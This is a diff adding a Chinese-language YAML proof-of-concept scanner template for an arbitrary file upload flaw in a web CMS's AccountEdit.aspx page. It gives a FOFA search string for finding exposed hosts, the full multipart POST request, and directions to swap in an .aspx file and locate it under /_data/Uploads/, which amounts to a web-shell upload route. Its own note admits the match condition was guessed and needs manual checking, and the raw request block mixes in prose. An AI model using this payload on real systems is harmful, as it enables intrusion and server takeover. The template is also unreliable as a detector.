@@ -1,0 +1,91 @@
+id: poc-kuc30u070ahswwf6
+info:
+  name: 微擎系统-AccountEdit任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kuc30u070ahswwf6
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kuc30u070ahswwf6
+    fofa: body="/Widgets/WidgetCollection/"
+http:
+- raw:
+  - '前端方式：
+
+    1、访问/User/AccountEdit.aspx，会有一个上传点，可手动上传文件
+
+
+    发包方式：
+
+    1、访问/User/AccountEdit.aspx，查看源代码，搜索__VIEWSTATE" value=" 和__EVENTVALIDATION" value="这两个字符串，记录下来
+
+    2、发包上传文件：
+
+    POST /User/AccountEdit.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: multipart/form-data;boundary=---------------------------8448979704593935221298734076
+
+
+    -----------------------------8448979704593935221298734076
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+    {VIEWSTATE}
+
+    -----------------------------8448979704593935221298734076
+
+    Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+
+    {EVENTVALIDATION}
+
+    -----------------------------8448979704593935221298734076
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="111.txt"
+
+    Content-Type: text/plain
+
+
+    1233311
+
+    -----------------------------8448979704593935221298734076
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"
+
+
+    上传图片
+
+    -----------------------------8448979704593935221298734076
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"
+
+
+
+    -----------------------------8448979704593935221298734076
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"
+
+
+
+    -----------------------------8448979704593935221298734076--
+
+
+    注意：上方的{VIEWSTATE}和{EVENTVALIDATION}为第一步获取的值，上传aspx文件自行修改后缀即可
+
+
+    3、文件路径在第2步的响应里面搜索字符_data/Uploads/  即可找到，然后直接url+/_data/Uploads/{filepath}访问即可。'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
